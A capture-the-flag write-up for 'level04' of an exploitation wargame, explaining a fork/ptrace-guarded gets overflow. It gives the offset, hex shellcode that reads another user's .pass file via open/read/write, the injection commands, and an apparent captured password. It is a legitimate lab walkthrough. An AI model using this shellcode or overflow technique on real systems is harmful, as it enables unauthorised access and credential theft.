# level04

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Basically, this program declares a buffer of 32 bytes, then calls `fork` to create a child process :

- In the child process, `ptrace` is used to make the process trackable, `puts` displays the hint "Give me some shellcode, k", then `gets` is called to fill the buffer.

- In the same time, the parent process wait for a status update from the child. If it receives a `SIGCHLD`, meaning the child process has exited, it returns too. Otherwise, it uses `ptrace` to monitor the syscalls done by the child process, especially looking for an `exec` call. If it catchs one, it kills the process and returns.

From here, we know that we have to design a shellcode that does not use any call to `exec`, and obviously find a way to call it. The use of `gets` inside the child process seems to be a good entrypoint for a buffer overflow attack.

## Exploit

We first look for the right offset to overwrite the return address, using a buffer overflow string generator. The result is 156.

Since we can't use the syscall `exec` , we will use a shellcode which calls `open/read/write` in order to print the content of the `.pass` file from the level05 user home. We add a nop sled in front of it and export it to the environment.

```console
level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*10 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
level04@OverRide:~$ env | grep SHELLCODE
SHELLCODE=����������1�1�1�1��2[�1�̀����1�̀�����
                                             $�̀1�9�t���̀���������/home/users/level05/.pass
``` 

Finally, we find the address of our variable SHELLCODE on the stack by running the executable in GDB, then run it again sending a string of 156 bytes followed by this address (plus a 16 bytes offset) to land into our nop sled.

```console
level04@OverRide:~$ python -c 'print "A" * 156 + "\x8c\xd8\xff\xff"' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```